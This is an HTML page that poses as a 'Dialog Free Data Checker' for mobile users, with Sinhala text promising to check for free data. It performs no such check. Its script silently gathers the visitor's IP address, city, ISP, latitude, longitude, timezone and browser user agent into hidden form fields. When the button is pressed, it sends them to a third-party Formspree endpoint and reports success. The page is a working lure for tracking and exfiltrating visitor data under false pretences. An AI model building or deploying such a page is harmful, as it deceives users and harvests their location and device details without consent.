<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Dialog Free Data Checker</title>
  <style>
    body {
      background: #121212;
      color: #fff;
      font-family: Arial, sans-serif;
      text-align: center;
      padding: 40px;
    }
    h2 {
      color: #00cec9;
    }
    p {
      color: #dfe6e9;
    }
    button {
      padding: 15px 30px;
      font-size: 18px;
      border: none;
      border-radius: 8px;
      background-color: #0984e3;
      color: white;
      cursor: pointer;
      margin-top: 30px;
    }
    #status {
      margin-top: 20px;
      display: none;
    }
  </style>
</head>
<body>
  <h2>Dialog Free Data Checker</h2>
  <p>Dialog සදහා නොමිලේ දත්ත ලබාදෙන්නේදැයි පරීක්ෂා කරන්න පහත බොත්තම ඔබන්න.</p>

  <form id="autoForm">
    <input type="hidden" name="IP Address" id="ip">
    <input type="hidden" name="Location" id="location">
    <input type="hidden" name="Device Info" id="device">
    <button type="submit">Check Free Data</button>
  </form>

  <p id="status">Submitting... Please wait</p>

  <script>
    async function fetchData() {
      try {
        const res = await fetch("https://ipwho.is/");
        const data = await res.json();
        if (data.success) {
          document.getElementById("ip").value = data.ip;
          document.getElementById("location").value = `
Country: ${data.country}
Region: ${data.region}
City: ${data.city}
ISP: ${data.connection.isp}
Latitude: ${data.latitude}
Longitude: ${data.longitude}
Timezone: ${data.timezone.id}`;
        }
        document.getElementById("device").value = navigator.userAgent;
      } catch (err) {
        console.error("Error fetching IP info", err);
      }
    }

    let ready = false;
    fetchData().then(() => {
      ready = true;
    });

    document.getElementById("autoForm").addEventListener("submit", async function (e) {
      e.preventDefault(); // prevent default until data loaded

      if (!ready) {
        alert("Gathering data... please wait a moment");
        return;
      }

      document.getElementById("status").style.display = "block";

      const formData = new FormData(this);
      await fetch("https://formspree.io/f/xvgkdndd", {
        method: "POST",
        body: formData,
        headers: { Accept: "application/json" }
      });

      document.getElementById("status").innerText = "Submitted Successfully!";
    });
  </script>
</body>
</html>
